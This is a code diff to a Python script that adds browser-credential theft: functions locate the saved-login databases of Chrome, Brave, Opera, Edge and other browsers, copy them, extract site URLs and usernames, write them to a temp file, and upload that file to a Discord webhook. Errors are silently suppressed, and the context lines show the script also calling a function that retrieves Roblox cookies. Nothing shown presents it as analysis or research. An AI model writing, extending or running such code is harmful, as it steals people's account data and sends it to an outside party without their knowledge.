@@ -401,6 +401,112 @@ def generate_key(length=20):
     characters = string.ascii_uppercase + string.digits
     return ''.join(random.choice(characters) for _ in range(length))
 
+def get_login_data_path(browser):
+    try:
+        user_profile = os.environ['USERPROFILE']
+        base_paths = {
+            "Chrome": os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data"),
+            "Brave": os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data"),
+            "Opera": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable"),
+            "Opera GX": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable"),
+            "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data"),
+            "Safari": os.path.join(user_profile, r"Library\Safari"),
+            "Edge": os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data")
+        }
+
+        for profile in ["Default", "Profile 1", "Profile 2"]:
+            candidate = os.path.join(base_paths[browser], profile, "Login Data")
+            if os.path.exists(candidate):
+                return candidate
+    except Exception as e:
+        pass
+    return None
+
+def get_history_path(browser):
+    try:
+        user_profile = os.environ['USERPROFILE']
+        history_paths = {
+            "Chrome": os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\History"),
+            "Brave": os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
+            "Opera": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable\History"),
+            "Opera GX": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable\History"),
+            "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data\Default\History"),
+            "Safari": os.path.join(user_profile, r"Library\Safari\History.db"),
+            "Edge": os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data\Default\History")
+        }
+
+        return history_paths.get(browser)
+    except Exception as e:
+        pass
+    return None
+
+def copy_database(source_path, temp_path):
+    try:
+        shutil.copy2(source_path, temp_path)
+        return True
+    except Exception as e:
+        return False
+
+def extract_logins(db_path):
+    results = []
+    try:
+        con = sqlite3.connect(db_path)
+        cur = con.cursor()
+        cur.execute("SELECT origin_url, username_value, date_created FROM logins")
+        rows = cur.fetchall()
+        con.close()
+
+        for url, username, timestamp in rows:
+            if not username.strip():
+                continue
+            try:
+                dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
+                iso_time = dt.isoformat()
+            except:
+                iso_time = "Unknown"
+            results.append((url, username, iso_time))
+    except Exception as e:
+        pass
+    return results
+
+def write_to_file(data, file_path):
+    try:
+        with open(file_path, 'w', encoding='utf-8') as f:
+            for url, email, timestamp in data:
+                f.write(f"URL: {url}\nEmail: {email}\nSaved: {timestamp}\n\n")
+    except Exception as e:
+        pass
+
+def send_file_to_discord(file_path):
+    try:
+        with open(file_path, 'rb') as f:
+            files = {
+                'file': (os.path.basename(file_path), f)
+            }
+            requests.post(WEBHOOK_URL, files=files)
+    except Exception as e:
+        pass
+
+def collect_browser_logins(browser):
+    try:
+        original_db = get_login_data_path(browser)
+        if not original_db:
+            return
+
+        temp_db = os.path.join(os.environ['TEMP'], f"{browser}_LoginData_Copy.db")
+        if not copy_database(original_db, temp_db):
+            return
+
+        logins = extract_logins(temp_db)
+        if not logins:
+            return
+
+        temp_txt = os.path.join(os.environ['TEMP'], f"{browser}_logins.txt")
+        write_to_file(logins, temp_txt)
+        send_file_to_discord(temp_txt)
+    except Exception as e:
+        pass
+
 if __name__ == "__main__":
     main()
     retrieve_roblox_cookies()
